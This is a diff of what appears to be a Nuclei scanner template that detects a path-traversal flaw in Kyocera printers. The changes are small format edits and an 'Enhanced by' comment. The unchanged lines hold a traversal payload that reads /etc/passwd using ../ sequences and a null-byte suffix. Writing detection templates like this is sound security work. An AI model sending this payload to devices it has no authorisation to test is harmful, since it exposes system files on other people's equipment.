@@ -13,10 +13,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: edb,printer,iot,kyocera,lfi
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg"
@@ -30,3 +28,5 @@ http:
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/08/03
